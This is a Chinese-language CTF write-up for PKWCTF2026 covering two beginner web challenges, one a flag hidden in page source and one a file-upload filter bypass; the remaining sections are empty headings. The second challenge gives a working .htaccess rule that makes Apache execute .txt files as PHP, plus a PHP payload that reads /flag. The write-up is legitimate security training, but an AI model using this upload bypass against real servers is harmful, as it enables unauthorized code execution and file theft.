# My WriteUp - PKWCTF2026

>**参赛队伍：** `​SuperSpider`

>**选手ID：** `sha11owSlng_Mz` 或 `shallowSingMz`（中途改名来着）

>**赛道：** 校内、新生

>**注1：** 解题时有大量 AI 成分，wp 全文为纯手搓。Orz. Orz.

>**注2：** 本文中所有本地 linux 操作均是在 wsl2 的 kali 中进行的。

>**github：** [https://github.com/shallowsingaa/my-wp-pkwctf2026](https://github.com/shallowsingaa/my-wp-pkwctf2026)

## 0x00 -> 目录

- [My WriteUp - PKWCTF2026](#my-writeup---pkwctf2026)
  - [0x00 -\> 目录](#0x00---目录)
  - [0x01 -\> Web](#0x01---web)
    - [01. 签到题【入门】](#01-签到题入门)
    - [02. mio上传【入门】](#02-mio上传入门)
    - [03. 纸上谈兵【入门】](#03-纸上谈兵入门)
  - [0x02 -\> Re](#0x02---re)
  - [0x03 -\> Pwn](#0x03---pwn)
  - [0x04 -\> Crypto](#0x04---crypto)
  - [0x05 -\> Misc](#0x05---misc)

## 0x01 -> Web

### 01. 签到题【入门】

*📌Question :*

```text
答案隐藏于页面的本源之中。常规的浏览方式无法寻觅，或许换一种途径能找到答案。
```

*📌Solution :*

F12 —— 元素 —— 找到奇怪的注释

![01-01](images/img-20260927033159_msedge.jpg)

得到 `UEtXQ1RGe2U0MmM3MDBkLTBkMDMtNGQ5MC1iN2QzLTU0NTIzOTNlYmFjN30=`

在 [CyperChef](https://cyberchef.org/) 用 base64 解码（From Base64）即可。

*📌FLAG :*

`PKWCTF{e42c700d-0d03-4d90-b7d3-5452393ebac7}`

*📌Summary :*

- 看网页源码的多种方式。
- 对 base64 敏感。

---

### 02. mio上传【入门】

*📌Question :*

```text
mio的文件上传中心 ，来找找mio的密码
```

```html
<!-- 前端源码主要部分 -->
<body>
    <div class="container">
        <img src="upload_mio.gif" alt="Mio Crying" class="top-gif">
        
        <h1>🌸 Mio的文件上传中心 🌸</h1>
        <p>欢迎来到 Mio 的文件上传中心~</p>

        <form action="" method="post" enctype="multipart/form-data">
            <div class="upload-area">
                <input type="file" name="uploaded" required>
                <br>
                <input type="submit" name="submit" value="上传文件 ➜" class="btn">
            </div>
        </form>

        
        <div class="bubble-hint">
            <strong>Mio的温馨提示：</strong><br>
            为了安全，PHP 文件是绝对禁止的哦！<br>
            <span style="font-size: 12px; color: #aaa;">(不过某些文件可能会影响服务器行为，请谨慎操作。...)</span>
        </div>
    </div>
</body>
```

*📌Solution :*

前端代码没发现异常，那么上传几个文件试试看。

实测发现只会拦截 .php .phtml .php3 .php4 等后缀名文件，其他都不拦，并且上传成功后会显示保存的位置 `upload/xxx`。

接下来 curl 看一下 http 头。（linux）

```bash
curl -I http://80-e4629aaa-af77-4f1d-8ab4-a21bef30556e.challenge.ctfplus.cn/
```

输出：

![02-01](img-20260927132921_WindowsTerminal.jpg)

重点是 Server 服务为 Apache，搜索相关可利用漏洞，再联想到网页里说的“PHP 文件是绝对禁止的”、“不过某些文件可能会影响服务器行为，请谨慎操作”，以及只拦截 php 文件，想到大概率是 `.htaccess` 文件的事儿。

新建一个 `.htaccess` 文件，写入：

```apache
AddType application/x-httpd-php .txt
```

含义：告诉服务器，把 htaccess 作用域内的所有 .txt 文件都当成 php 处理。

再新建一个 `payload.txt` 文件，写入：

```php
<?php 
  echo file_get_contents("/flag");
?>
```

先后上传这两个文件，成功后访问路径 `/upload/payload.txt`，即可。

*📌FLAG :*

`PKWCTF{0aab29cc-be4d-46a8-9cb0-09089795d943}`

*📌Summary :*

- 侦查：实测文件上传黑名单可能的内容。
- 侦查：curl 探测 http 头，知晓网页服务器软件为 Apache。
- 要了解 .htaccess 配置文件的工作原理，尤其是：热更新，作用域为同目录。
- 了解 php 基本用法。

---

### 03. 纸上谈兵【入门】



## 0x02 -> Re



## 0x03 -> Pwn



## 0x04 -> Crypto



## 0x05 -> Misc